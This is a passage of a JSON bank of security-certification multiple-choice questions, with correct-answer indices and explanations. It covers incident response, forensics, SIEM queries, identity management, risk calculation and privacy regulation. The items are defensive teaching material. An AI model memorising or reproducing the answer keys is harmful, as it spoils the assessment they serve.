      "q": "A security engineer implements a SOAR (Security Orchestration, Automation, and Response) playbook that automatically blocks IP addresses at the firewall when an alert fires. A false positive causes a legitimate customer's IP to be blocked. What is the PRIMARY risk of automated response actions?",
      "opts": [
        "No risk — blocking IPs is always a safe automated action",
        "Automated blocking without human verification can cause availability issues for legitimate users; SOAR actions should be designed with appropriate human review gates for high-impact actions, or use time-limited automatic blocks with immediate human notification",
        "The SOAR platform will automatically unblock the IP after 24 hours",
        "Only external IPs should ever be blocked automatically — internal IPs are safe"
      ],
      "correct": 1,
      "exp": "SOAR automation risk: automated high-impact actions can cause outages. Blocking legitimate customer IPs = revenue impact + customer service burden. Best practices: (1) Automated low-risk actions (quarantine endpoint, disable account, send notification) without human review. (2) High-risk actions (firewall block, account deletion) with human approval gate. (3) Time-limited automatic blocks (e.g., block for 30 minutes pending analyst review). (4) Safelist known legitimate IPs before automation. False positive rates matter critically in automated response."
    },
    {
      "id": "m352",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Incident Response",
      "q": "Which type of incident response exercise involves key stakeholders gathering in a room to verbally walk through their response to a simulated incident scenario, without any technical systems being affected?",
      "opts": [
        "Simulation exercise — actual technical systems are tested in a controlled environment",
        "Tabletop exercise — a discussion-based exercise where participants talk through their response to a scenario",
        "Full-scale exercise — all IR capabilities are activated and tested",
        "Penetration test — security controls are actively attacked"
      ],
      "correct": 1,
      "exp": "A tabletop exercise is a facilitated, discussion-based exercise. No actual systems are affected. Participants talk through: \"The CISO receives a call that ransomware is spreading. What do you do?\" This identifies: gaps in plans, unclear roles, missing communication channels, and coordination issues. Cheap, quick, and valuable. Complement with simulation exercises (technical systems tested) and full-scale exercises for comprehensive IR preparedness."
    },
    {
      "id": "m353",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Digital Forensics",
      "q": "During analysis of a compromised Linux server, a forensic examiner runs \"lsof -p [PID]\" on a suspicious process and sees a deleted file still being held open by the process (shown as \"(deleted)\" in the output). What does this indicate and how can the file content be recovered?",
      "opts": [
        "The file is permanently deleted and cannot be recovered",
        "A running process keeps a file descriptor open even after the file is \"deleted\" from the filesystem. The file content remains on disk until the process releases it or closes. The content can be recovered by reading /proc/[PID]/fd/[FD_NUMBER] — the kernel's file descriptor entry still points to the data.",
        "The file was encrypted and must be decrypted before recovery",
        "lsof cannot show deleted files — the output is a false positive"
      ],
      "correct": 1,
      "exp": "Linux file deletion: \"deleting\" removes the directory entry but doesn't zero the data blocks — they are freed only when no process has an open file descriptor. A process that opens a file and the file is subsequently deleted keeps the data accessible through its file descriptor. Recovery: cat /proc/[PID]/fd/[FD_NUMBER] > recovered_file. Attackers use this technique to load tools into memory (and get them off disk) while keeping them accessible through an open file descriptor."
    },
    {
      "id": "m354",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Vulnerability Management",
      "q": "A security manager wants to measure the effectiveness of the vulnerability management programme. Which metric BEST indicates whether vulnerabilities are being addressed promptly?",
      "opts": [
        "Total number of vulnerabilities discovered — higher is more thorough",
        "Mean Time to Remediate (MTTR) by severity level — tracks how long it takes to fix vulnerabilities from discovery to verification, compared against defined SLAs",
        "Percentage of systems scanned — higher coverage is better",
        "Number of critical vulnerabilities discovered per scan"
      ],
      "correct": 1,
      "exp": "MTTR (Mean Time to Remediate) measures programme effectiveness — not just discovery but actual fixing. Comparing MTTR against SLAs: \"Critical: remediate within 15 days; High: within 30 days\" — if MTTR exceeds SLA, the programme is not meeting its objectives. Other useful metrics: SLA compliance rate (% of vulnerabilities fixed within SLA), remediation backlog trend, vulnerability density by system type. Scan coverage is a process metric; MTTR measures outcome."
    },
    {
      "id": "m355",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Identity Management",
      "q": "An employee transfers from the sales department to HR. Their sales system access should be removed and HR system access granted. However, only the HR access is added and sales access is never removed. What problem has occurred?",
      "opts": [
        "Authentication failure — the employee cannot log in to the HR system",
        "Privilege creep — the employee accumulates access from multiple roles over time without deprovisioning previous access",
        "Separation of duties violation — HR and sales access cannot be combined",
        "A Trojan horse — the employee is secretly maintaining sales access"
      ],
      "correct": 1,
      "exp": "Privilege creep: over time, users accumulate access from multiple roles as they change positions. Without a formal deprovisioning process triggered by role changes, old access is never removed. The employee now has both sales and HR data access — violating least privilege. Prevention: automated JML (Joiner-Mover-Leaver) process that removes old access when provisioning new access, and periodic access reviews (recertification campaigns) to identify and remove unnecessary access."
    },
    {
      "id": "m356",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Security Monitoring",
      "q": "A network security analyst notices that a server is sending unusually large amounts of data to an external IP address via HTTPS (port 443). Standard DLP tools cannot inspect the content due to encryption. Which control would enable inspection of this traffic?",
      "opts": [
        "Block all HTTPS outbound traffic — this prevents data exfiltration",
        "Deploy a full SSL/TLS inspection proxy — the proxy decrypts, inspects, and re-encrypts traffic; detected policy violations can be blocked",
        "Deploy DNSSEC — this prevents DNS hijacking that could redirect the traffic",
        "Implement port-based blocking of port 443"
      ],
      "correct": 1,
      "exp": "SSL/TLS inspection (HTTPS inspection): a proxy terminates the TLS session, decrypts the content, applies DLP/AV/URL filtering, then re-encrypts and forwards. Requires deploying the proxy's CA certificate to all managed devices. Concerns: (1) Privacy — employee personal banking traffic is also inspected. (2) Performance — decryption/re-encryption is CPU-intensive. (3) Certificate handling — pinned apps fail. Best practice: exclude sensitive categories (banking, healthcare), log that inspection occurred."
    },
    {
      "id": "m357",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Incident Response",
      "q": "During an investigation, an IR analyst discovers that the attacker achieved persistence using a Windows Management Instrumentation (WMI) subscription. What makes WMI-based persistence particularly challenging to detect and remove?",
      "opts": [
        "WMI is only available on Windows Server systems",
        "WMI subscriptions can survive reboots, are stored in the WMI repository (not as files or registry keys), execute code in response to system events (like system boot or user logon) without creating obvious process chains, and are not visible in standard persistence check locations like registry Run keys or scheduled tasks",
        "WMI persistence is only possible with physical access to the system",
        "WMI subscriptions are automatically removed by Windows Defender"
      ],
      "correct": 1,
      "exp": "WMI Persistence (MITRE T1546.003): attackers create WMI event subscriptions that execute code when triggered by system events (e.g., at boot, on logon, after N seconds of idle). Unlike registry Run keys, WMI subscriptions are stored in the WMI repository (%windir%System32wbemRepository) — not file system or registry. Many standard security tools don't inspect WMI subscriptions. Detection: WMI activity Event IDs 5857-5861, Sysmon Event ID 19-21, or direct WMI query for active subscriptions."
    },
    {
      "id": "m358",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Digital Forensics",
      "q": "What is the LEGAL significance of chain of custody in digital forensics?",
      "opts": [
        "Chain of custody only applies to physical evidence, not digital",
        "Chain of custody documents the complete history of evidence handling — who collected, transported, stored, and analysed the evidence. An unbroken chain demonstrates evidence integrity and is required for evidence to be admissible in legal proceedings.",
        "Chain of custody is an optional best practice that doesn't affect evidence admissibility",
        "Chain of custody only matters if the case goes to trial"
      ],
      "correct": 1,
      "exp": "Chain of custody: a legally required documentation process. For each piece of evidence, it records: who collected it, when and where, how it was packaged and sealed, each transfer of custody (with signatures), and storage conditions. An unbroken chain proves: (1) The evidence was not tampered with. (2) It is what it is claimed to be. (3) It maintains integrity from collection to presentation in court. A broken chain (missing signature, undocumented transfer) can result in evidence being ruled inadmissible."
    },
    {
      "id": "m359",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Vulnerability Management",
      "q": "A red team engagement differs from a standard penetration test in several ways. Which statement BEST describes the primary distinction?",
      "opts": [
        "Red team engagements use more sophisticated tools than penetration tests",
        "A red team engagement simulates a full Advanced Persistent Threat (APT) attack campaign over an extended period (weeks/months) with specific objectives (e.g., access finance server), using stealth techniques, and testing the blue team's detection and response capabilities — whereas a penetration test is time-limited, scope-defined, and focuses on finding and demonstrating vulnerabilities",
        "Red team engagements are always external; penetration tests are internal",
        "Red team engagements are less expensive than penetration tests"
      ],
      "correct": 1,
      "exp": "Red team engagement: simulates APT-style attacks with defined objectives, extended time, stealth (avoiding detection), and tests the full kill chain including physical, social, and technical attack vectors. Tests whether the blue team can detect and respond. Penetration test: finds and documents as many vulnerabilities as possible within a defined scope and time period — not necessarily stealthy, focused on vulnerability discovery. Red team tests resilience; pen test tests attack surface."
    },
    {
      "id": "m360",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Identity Management",
      "q": "An organisation implements zero-standing privileges (ZSP) for all administrative access. What does ZSP mean and how does it differ from just-in-time (JIT) access?",
      "opts": [
        "ZSP means no accounts exist at all — all actions are unauthenticated",
        "Zero Standing Privileges means no user has permanently assigned elevated privileges at any time — access is granted dynamically, on demand, for specific tasks, for a limited time. JIT provides temporary access on demand but some JIT implementations still maintain standing \"eligible\" assignments. True ZSP means privileges are created on demand and completely removed after use, with no persistent privileged state.",
        "ZSP means admins use two passwords instead of one",
        "ZSP means administrative tasks require two people to be present"
      ],
      "correct": 1,
      "exp": "ZSP (Zero Standing Privileges): the most extreme form of JIT. No standing admin accounts exist at all — when an admin needs elevated access, privileges are dynamically provisioned, approved, time-bounded, and completely deprovisioned afterward. This eliminates persistent privileged accounts entirely. JIT may still have accounts with standing \"eligible\" role assignments (like Entra PIM Eligible) — the account exists with no active privileges until activated. ZSP goes further: no standing eligible assignments at all."
    },
    {
      "id": "m361",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Security Monitoring",
      "q": "What does \"SIEM\" stand for and what are its two primary functions?",
      "opts": [
        "Security Intelligence and Event Management — primary functions: network segmentation and access control",
        "Security Information and Event Management — primary functions: log aggregation from multiple sources and real-time correlation of events to detect security incidents",
        "Secure Internet Event Monitoring — primary functions: web filtering and email security",
        "System Intrusion Event Manager — primary functions: endpoint protection and firewall management"
      ],
      "correct": 1,
      "exp": "SIEM: (1) Security Information Management (SIM): long-term log storage, archiving, and analysis. (2) Security Event Management (SEM): real-time event correlation, alerting, and dashboards. Together: collect logs from firewalls, endpoints, servers, applications → normalise to common format → correlate related events across sources → alert on suspicious patterns → retain for compliance and forensics. Commercial SIEMs: Splunk, Microsoft Sentinel, IBM QRadar."
    },
    {
      "id": "m362",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Incident Response",
      "q": "An organisation's security team receives a call that a critical server is behaving abnormally. A junior analyst immediately begins a full forensic investigation on the live system. What critical step was potentially skipped?",
      "opts": [
        "The analyst should have used a different forensic tool",
        "The analyst should have first notified management and opened an incident ticket",
        "The analyst should have first assessed whether containment was needed to prevent ongoing damage or spread — beginning a lengthy investigation on an actively compromised live system delays containment, potentially allowing the attacker to continue causing damage or spreading to other systems",
        "The analyst should have first checked the server's patch level"
      ],
      "correct": 2,
      "exp": "The IR lifecycle: Detection → Assessment and Containment → Eradication → Recovery → Forensics/Post-Incident. Containment should precede deep forensics if the system is actively compromised. Investigating a live system while it is communicating with an attacker: (1) Allows the attacker to observe that they've been detected. (2) The attacker may erase traces or deploy additional payloads. (3) Delays stopping the damage. Exception: if forensics requires a live system (volatile data capture), capture quickly then isolate."
    },
    {
      "id": "m363",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Digital Forensics",
      "q": "A forensic analyst examines browser artefacts on a suspect's workstation. Which artefact would MOST definitively prove the user visited a specific website at a specific time, even if the browser history was deleted?",
      "opts": [
        "The browser's bookmarks file",
        "The DNS cache — though cleared on reboot, hosts file entries remain",
        "Browser cache files with timestamp metadata, web history records in the browser's SQLite databases (even if deleted, may be recoverable with SQLite forensics tools), and Windows registry artefacts (TypedURLs, RunMRU)",
        "The user's email inbox"
      ],
      "correct": 2,
      "exp": "Browser forensics: (1) SQLite databases (History, Downloads, Cookies): browsers store history in SQLite; deleted records may persist in the SQLite WAL (Write-Ahead Log) or unallocated pages. (2) Cache files: cached web content includes URL and timestamp in metadata. (3) Windows registry TypedURLs: records URLs typed in the address bar. (4) Volume Shadow Copies: may contain pre-deletion copies of browser history files. Multiple artefact correlation provides the strongest evidence."
    },
    {
      "id": "m364",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Vulnerability Management",
      "q": "During a penetration test, the tester uses the command \"nmap -sS -sV -O 192.168.1.0/24\". What type of scan is being performed and what information is being gathered?",
      "opts": [
        "A UDP scan gathering only port status information",
        "A TCP SYN (half-open) scan (-sS) discovering open ports, service version detection (-sV) identifying services and versions, and OS detection (-O) fingerprinting the operating system — gathering comprehensive host information for the target subnet",
        "A simple ping sweep to determine which hosts are alive",
        "A vulnerability scan checking for specific known CVEs"
      ],
      "correct": 1,
      "exp": "-sS: SYN scan (half-open) — sends SYN, waits for SYN-ACK (open) or RST (closed), sends RST to avoid completing the handshake. Stealthier than full connect scan but still logged by modern systems. -sV: service version detection — probes open ports to identify service name and version. -O: OS detection — analyses TCP/IP stack behaviour to fingerprint the OS. 192.168.1.0/24: entire subnet. Result: comprehensive map of hosts, open ports, services, and OSes for planning further attacks."
    },
    {
      "id": "m365",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Identity Management",
      "q": "An organisation wants to implement Single Sign-On (SSO) for all cloud applications. The IT team is considering SAML 2.0 vs OpenID Connect (OIDC). What is the PRIMARY technical difference between SAML and OIDC?",
      "opts": [
        "SAML is only for web applications; OIDC is for mobile applications only",
        "SAML 2.0 uses XML-based assertions and is well-suited for enterprise web application SSO; OIDC uses JSON/JWT-based tokens (ID tokens) and is built on OAuth 2.0, making it more lightweight and developer-friendly for modern APIs, mobile apps, and microservices",
        "SAML provides stronger encryption than OIDC",
        "OIDC requires PKI certificates while SAML does not"
      ],
      "correct": 1,
      "exp": "SAML 2.0: XML-based, complex, heavy, well-established in enterprise (especially legacy web apps). IdP redirects browser with XML assertions. Strong for browser-based SSO. OIDC (OpenID Connect): built on OAuth 2.0, uses JSON/JWT tokens, RESTful, lightweight. Better for: modern web apps (SPAs), mobile apps, APIs, microservices. Both provide SSO; OIDC is generally preferred for new implementations due to developer ergonomics and API compatibility."
    },
    {
      "id": "m366",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Security Monitoring",
      "q": "A SOC analyst uses Splunk to investigate an alert. The query: index=windows EventCode=4688 | where CommandLine like \"%powershell%\" AND CommandLine like \"%-enc%\" | stats count by Computer, Account. What is this query designed to detect?",
      "opts": [
        "All PowerShell executions across the environment",
        "Systems with PowerShell installed but never used",
        "PowerShell processes spawned with encoded commands (-enc / -EncodedCommand) — a common technique for obfuscating malicious scripts",
        "Administrator accounts that have executed PowerShell"
      ],
      "correct": 2,
      "exp": "EventCode 4688 = New Process Creation (requires Process Command Line Audit to be enabled). CommandLine like \"%powershell%\" = any PowerShell execution. CommandLine like \"%-enc%\" = PowerShell executed with -EncodedCommand (or -enc shorthand), which Base64-encodes the command to obfuscate it. This is MITRE T1059.001 (PowerShell) + T1027 (Obfuscated Files). The stats summarise by Computer and Account to identify which systems and users are executing obfuscated PowerShell."
    },
    {
      "id": "m367",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Incident Response",
      "q": "An organisation's business continuity plan identifies the order in which systems should be restored after a major disaster. This prioritised recovery list is called a:",
      "opts": [
        "Business Impact Analysis (BIA)",
        "Recovery Time Objective (RTO) list",
        "System recovery priority list or restoration order — defining which systems are most critical and must be restored first",
        "Disaster Recovery Plan (DRP) checklist"
      ],
      "correct": 2,
      "exp": "After a disaster, resources are limited — not all systems can be restored simultaneously. A recovery priority list defines restoration order based on: (1) Business criticality (revenue, patient safety, life safety). (2) Dependencies (infrastructure before applications; directory services before email). (3) RTO targets (lowest RTO = highest priority). The BIA identifies business impact per system. The RTO specifies the time requirement. The recovery priority list translates both into the actual restoration sequence."
    },
    {
      "id": "m368",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Digital Forensics",
      "q": "A forensic analyst is examining a Windows system and wants to determine which user accounts have logged on interactively. Which Windows Event Log Event IDs and log file are MOST relevant?",
      "opts": [
        "Event ID 7045 in System.evtx — new service installation",
        "Event IDs 4624 (successful logon) and 4634 (logoff) in Security.evtx, filtered by Logon Type 2 (interactive) or 10 (remote interactive/RDP) — provide user, timestamp, logon method, and source",
        "Event ID 1102 in Security.evtx — audit log cleared",
        "Event ID 4688 in Security.evtx — process creation"
      ],
      "correct": 1,
      "exp": "Windows authentication audit events in Security.evtx: 4624: Successful logon — includes: Account Name, Logon Type (2=console, 3=network, 10=RDP, 5=service), Source IP, Logon ID (for correlation with 4634). 4634: Logoff — correlate with 4624 via Logon ID for session duration. 4625: Failed logon. 4648: Logon using explicit credentials. Logon Type is critical — filter Type 2 and 10 for interactive sessions; Type 3 for lateral movement."
    },
    {
      "id": "m369",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Vulnerability Management",
      "q": "A vulnerability scan report lists \"Apache HTTP Server 2.4.50 - Path Traversal and RCE (CVE-2021-41773).\" The server is running Apache 2.4.51. Is this system affected?",
      "opts": [
        "Yes — all Apache HTTP Server versions are vulnerable",
        "No — Apache 2.4.51 was released specifically to patch CVE-2021-41773; if correctly updated to 2.4.51, this specific vulnerability is fixed",
        "Cannot determine without knowing the OS",
        "Yes — path traversal vulnerabilities affect all versions of web servers"
      ],
      "correct": 1,
      "exp": "CVE-2021-41773 affected Apache 2.4.49 specifically (path traversal + RCE via CGI if mod_cgi enabled). Apache 2.4.50 was released with an incomplete fix, and 2.4.51 fully resolved it. A system running 2.4.51 is not affected by this specific CVE. This illustrates the importance of version-specific vulnerability information. Vulnerability scanners may false-positive if they detect the product name but not the specific version. Always verify the exact version and patch level."
    },
    {
      "id": "m370",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Identity Management",
      "q": "A security architect designs a Zero Trust implementation for an organisation. Employee devices are not corporate-managed (BYOD). Which combination of controls achieves Zero Trust access to internal applications from unmanaged devices?",
      "opts": [
        "Install a VPN client on personal devices — this provides sufficient Zero Trust controls",
        "Deploy Identity-Aware Proxy (IAP) / ZTNA solution that: verifies user identity via MFA, assesses device posture (OS patch level, certificate, known device) via an endpoint agent or browser-based check, enforces application-level access policies, and provides session-based access to specific applications without network-level access",
        "Require all BYOD devices to join the corporate Active Directory domain",
        "Block all access from unmanaged devices — BYOD is incompatible with Zero Trust"
      ],
      "correct": 1,
      "exp": "ZTNA (Zero Trust Network Access) / Identity-Aware Proxy for BYOD: (1) Identity: user authenticated via IdP + MFA regardless of device. (2) Device posture: browser-based or lightweight agent checks OS version, patch status, and presence of required security tools. (3) Application-level access: proxy provides access only to the specific application — not the whole network. (4) Session controls: watermarking, download prevention, continuous re-authentication. This allows unmanaged devices with appropriate controls."
    },
    {
      "id": "m371",
      "ch": "5",
      "difficulty": "easy",
      "topic": "Governance",
      "q": "An organisation's board of directors approves a document stating: \"All company systems must use encryption for sensitive data in transit and at rest.\" This document is BEST classified as:",
      "opts": [
        "A technical standard specifying encryption algorithms",
        "A security procedure detailing how to implement encryption",
        "A security policy — a high-level, management-approved statement of organisational intent and requirements",
        "A guideline providing non-mandatory encryption recommendations"
      ],
      "correct": 2,
      "exp": "A security policy is a high-level, board/executive-approved document stating organisational requirements and intent. It answers \"what\" and \"why\" — not \"how.\" Policies are mandatory. A standard specifies \"what specifically\" (e.g., \"use AES-256\"). A procedure specifies \"how exactly\" (step-by-step implementation). A guideline is non-mandatory recommendation. The hierarchy: Policy → Standard → Procedure, with Guidelines as advisory documents."
    },
    {
      "id": "m372",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Governance",
      "q": "An organisation wants to achieve ISO 27001 certification. What does this certification confirm?",
      "opts": [
        "All staff have completed security awareness training",
        "The organisation uses specific technical security products recommended by ISO",
        "The organisation has implemented and maintains an Information Security Management System (ISMS) that meets the ISO 27001 standard requirements, as verified by an accredited certification body",
        "The organisation has never suffered a data breach"
      ],
      "correct": 2,
      "exp": "ISO 27001 is an international standard for Information Security Management Systems. Certification confirms: (1) The organisation has systematically assessed information security risks. (2) Implemented appropriate controls (from Annex A). (3) Has management commitment, policies, and procedures. (4) Continuously improves the ISMS. An accredited certification body (not ISO itself) performs the audit. Certification doesn't guarantee zero breaches — it confirms a mature, systematic approach to managing security risk."
    },
    {
      "id": "m373",
      "ch": "5",
      "difficulty": "easy",
      "topic": "Risk Management",
      "q": "An organisation identifies a risk and calculates: Asset Value = £1,000,000; Exposure Factor = 0.30; Annual Rate of Occurrence = 0.50. What is the Annualised Loss Expectancy (ALE)?",
      "opts": [
        "£150,000",
        "£500,000",
        "£300,000",
        "£1,500,000"
      ],
      "correct": 0,
      "exp": "Quantitative risk: SLE = Asset Value × Exposure Factor = £1,000,000 × 0.30 = £300,000. ALE = SLE × ARO = £300,000 × 0.50 = £150,000. ALE represents expected annual loss from this specific risk. If a control costs £50,000/year and reduces ALE from £150,000 to £30,000, the value of the control = £150,000 - £30,000 - £50,000 = £70,000 net benefit — the control is cost-justified."
    },
    {
      "id": "m374",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Risk Management",
      "q": "A CISO presents two options to address a high-risk finding: Option A: Implement a £200,000 control that reduces risk by £180,000/year. Option B: Purchase cyber insurance for £50,000/year that covers losses from this risk. What risk treatment strategies are Options A and B?",
      "opts": [
        "A: Risk avoidance / B: Risk acceptance",
        "A: Risk mitigation / B: Risk transference",
        "A: Risk acceptance / B: Risk avoidance",
        "A: Risk transference / B: Risk mitigation"
      ],
      "correct": 1,
      "exp": "Option A (implementing a control to reduce likelihood/impact) = Risk Mitigation. Option B (purchasing insurance to shift financial burden to insurer) = Risk Transference. Note: Option A actually costs more than it saves (£200,000 cost vs £180,000/year reduction) — a negative ROI, suggesting Option B may be more cost-effective. In practice, you'd want to verify the EF and ARO assumptions and whether the control eliminates the risk entirely over time."
    },
    {
      "id": "m375",
      "ch": "5",
      "difficulty": "hard",
      "topic": "Risk Management",
      "q": "A risk register item reads: \"Vendor supplies proprietary software with no source code access and performs all patches. The vendor has had 3 security incidents in 5 years.\" Which risk management consideration applies?",
      "opts": [
        "This risk cannot be managed — it must be accepted or the vendor replaced",
        "Third-party/supply chain risk management: conduct vendor security assessments (SOC 2 Type II report review, security questionnaire, right-to-audit clause), include security requirements in the contract (patch SLAs, breach notification obligations, data handling requirements), and monitor vendor security posture continuously",
        "Accept the risk entirely — external vendors are not the organisation's responsibility",
        "Transfer all risk to the vendor contractually"
      ],
      "correct": 1,
      "exp": "Third-party risk management (TPRM): organisations remain accountable for risks from their vendors. Key controls: (1) Vendor due diligence: SOC 2 reports, security questionnaires, penetration test summaries. (2) Contractual requirements: patch SLAs, breach notification, right-to-audit, data handling obligations, liability provisions. (3) Ongoing monitoring: periodic reassessment, monitoring for vendor incidents, supply chain threat intelligence. The vendor's 3 incidents in 5 years is a risk indicator requiring additional scrutiny."
    },
    {
      "id": "m376",
      "ch": "5",
      "difficulty": "easy",
      "topic": "Compliance",
      "q": "An organisation processes personal health information (PHI) for US patients. Which federal regulation governs the security and privacy of this data?",
      "opts": [
        "PCI DSS — Payment Card Industry Data Security Standard",
        "FERPA — Family Educational Rights and Privacy Act",
        "GDPR — General Data Protection Regulation",
        "HIPAA — Health Insurance Portability and Accountability Act"
      ],
      "correct": 3,
      "exp": "HIPAA (Health Insurance Portability and Accountability Act) governs Protected Health Information (PHI) for US healthcare. Applies to: covered entities (healthcare providers, health plans, healthcare clearinghouses) and their business associates. Key rules: Privacy Rule (use and disclosure of PHI), Security Rule (safeguards for electronic PHI), Breach Notification Rule (notification within 60 days). Violations: civil penalties up to $1.9M/year per violation category; criminal penalties for wilful neglect."
    },
    {
      "id": "m377",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Compliance",
      "q": "An organisation subject to PCI DSS processes payment cards. They want to reduce their PCI DSS scope to lower compliance burden. Which strategy MOST effectively reduces scope?",
      "opts": [
        "Encrypting all cardholder data — encryption removes PCI DSS scope requirements",
        "Network segmentation — isolating the cardholder data environment (CDE) from the rest of the network so that systems outside the CDE are not in scope",
        "Conducting annual penetration tests — this removes scope requirements",
        "Hiring a QSA (Qualified Security Assessor) — this automatically reduces scope"
      ],
      "correct": 1,
      "exp": "PCI DSS scope: all systems that store, process, or transmit cardholder data (the CDE) plus any system that could affect the security of the CDE. Network segmentation that effectively isolates the CDE from other networks means that non-CDE systems cannot affect the CDE — removing them from scope. Encryption protects data but doesn't remove scope (the encryption key and the process that uses it remain in scope). QSAs assess compliance; they don't reduce scope."
    },
    {
      "id": "m378",
      "ch": "5",
      "difficulty": "hard",
      "topic": "Compliance",
      "q": "An organisation stores EU customer data in the United States. Post-Brexit, the UK also has separate data protection rules. GDPR Article 46 requires what for data transfers outside the EEA?",
      "opts": [
        "No requirements — data can flow freely between any countries",
        "Appropriate safeguards must be in place for transfers outside the EEA, such as Standard Contractual Clauses (SCCs), Binding Corporate Rules (BCRs), or reliance on an adequacy decision from the European Commission — absent these, transfers are prohibited",
        "Encryption of all transferred data is sufficient — no contractual requirements",
        "Data can only be transferred to countries that are members of the UN"
      ],
      "correct": 1,
      "exp": "GDPR international data transfers: personal data can only leave the EEA if: (1) The destination country has an EU adequacy decision (e.g., UK currently has adequacy, Japan, Canada). (2) Standard Contractual Clauses (SCCs): contractual commitments by recipient. (3) Binding Corporate Rules (BCRs): approved intra-group transfer mechanisms. (4) Other Article 46 mechanisms. Post-Schrems II, US-EU transfers use the EU-US Data Privacy Framework (successor to Privacy Shield). Transfers without a valid mechanism violate GDPR."
    },
    {
      "id": "m379",
      "ch": "5",
      "difficulty": "easy",
      "topic": "Data Privacy",
      "q": "Under GDPR, which principle requires that personal data collected for one specific purpose should not be used for a different, incompatible purpose without additional consent or legal basis?",
      "opts": [
        "Data minimisation — collect only what is necessary",
        "Purpose limitation — data collected for one purpose should not be repurposed without consent or legal basis",
        "Storage limitation — data should not be kept longer than necessary",
        "Accuracy — data should be kept accurate and up to date"
      ],
      "correct": 1,
      "exp": "GDPR's purpose limitation principle (Article 5(1)(b)): personal data must be collected for specified, explicit, and legitimate purposes, and must not be further processed in a way incompatible with those purposes. Example: collecting email for order confirmation cannot be repurposed for marketing without separate consent. Some compatible further processing is allowed (archiving in public interest, scientific research) with appropriate safeguards."
    },
    {
      "id": "m380",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Data Privacy",
      "q": "A company uses a third-party analytics platform that processes user behaviour data on their behalf. Under GDPR, what must the company do before sharing personal data with this third party?",
      "opts": [
        "Get verbal agreement from the third party that they will protect the data",
        "Sign a Data Processing Agreement (DPA) with the third party — GDPR Article 28 requires a contract specifying how the processor may use the data, their security obligations, and their assistance with data subject rights",
        "Notify the third party's national supervisory authority",
        "Encrypt the data before sending it — no contract is needed if data is encrypted"
      ],
      "correct": 1,
      "exp": "GDPR Article 28 — Data Processing Agreement (DPA): when a controller uses a processor (third party), a written contract must specify: subject matter and duration, nature and purpose of processing, type of personal data and categories of data subjects, and the processor's obligations including security measures, sub-processor approval, breach notification, and assistance with data subject rights. All major cloud providers (AWS, Google, Microsoft) offer DPAs as standard. Processing without a DPA violates GDPR."
    },
    {
      "id": "m381",
      "ch": "5",
      "difficulty": "hard",
      "topic": "Data Privacy",
      "q": "A company's privacy notice states they collect \"first name, email address, and purchase history.\" They begin analysing IP addresses and device fingerprints for fraud detection without updating their privacy notice. What GDPR principle have they violated?",
      "opts": [
        "Data accuracy — the privacy notice is now inaccurate",
        "Transparency / lawfulness — collecting and processing data subjects weren't informed about violates the transparency principle (Article 5(1)(a)) and may lack a lawful basis for the undisclosed processing",
        "Storage limitation — they are storing too much data",
        "Data minimisation — collecting IP addresses is excessive"
      ],
      "correct": 1,
      "exp": "GDPR Transparency: organisations must inform data subjects about what data is collected and how it is used (privacy notice / fair processing notice). Processing IP addresses and device fingerprints not disclosed in the privacy notice violates: (1) Transparency (Article 5(1)(a)): data subjects weren't informed. (2) Potentially Lawfulness: if the only legal basis was consent based on the original privacy notice, that consent doesn't cover the undisclosed processing. Update privacy notices and notify users of material changes."
    },
    {
      "id": "m382",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Governance",
      "q": "A company's CISO wants to improve the security culture. Research shows which type of security awareness training approach produces the MOST lasting behavioural change?",
      "opts": [
        "Annual 4-hour compliance training sessions that cover all security topics",
        "Short, frequent, role-specific training modules (5-10 minutes) combined with practical exercises (phishing simulations, gamification) and immediate reinforcement — delivered throughout the year",
        "One-time training during onboarding",
        "Security awareness posters in common areas"
      ],
      "correct": 1,
      "exp": "Effective security awareness: (1) Frequency: regular short modules beat infrequent long sessions (memory retention decays rapidly). (2) Relevance: role-specific content (finance team learns invoice fraud; developers learn secure coding). (3) Practice: phishing simulations with immediate feedback create memorable learning moments. (4) Gamification: increases engagement. Annual checkbox training produces compliance completion rates — not behaviour change. Measure: phishing simulation click rates, reported security incidents."
    },
    {
      "id": "m383",
      "ch": "5",
      "difficulty": "easy",
      "topic": "Risk Management",
      "q": "A Business Impact Analysis (BIA) is conducted for an organisation's systems. What is the PRIMARY purpose of the BIA?",
      "opts": [
        "Identifying all technical vulnerabilities in business systems",
        "Calculating the total cost of all security controls",
        "Identifying the business functions, the impact of disruption, and the maximum tolerable downtime for each — informing recovery priorities and RTO/RPO targets",
        "Documenting all regulatory compliance requirements"
      ],
      "correct": 2,
      "exp": "A BIA (Business Impact Analysis): (1) Identifies critical business functions and their supporting IT systems. (2) Determines the impact of disruption (financial, operational, reputational, legal). (3) Establishes MTD (Maximum Tolerable Downtime) per function — the basis for RTO. (4) Determines acceptable data loss — the basis for RPO. (5) Identifies dependencies between functions. BIA output directly drives: backup frequency, replication requirements, DR site capabilities, and recovery priorities."
    },
    {
      "id": "m384",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Compliance",
      "q": "An organisation's annual penetration test report finds a critical vulnerability. The organisation acknowledges the finding but takes no action within the year, citing budget constraints. How does this affect their liability in the event of a breach exploiting this vulnerability?",
      "opts": [
        "The penetration test report provides legal protection — having identified the risk removes liability",
        "Documented awareness of a critical vulnerability that was not remediated constitutes \"known risk\" — this could significantly increase legal and regulatory liability, as the organisation knew of the risk and chose not to address it",
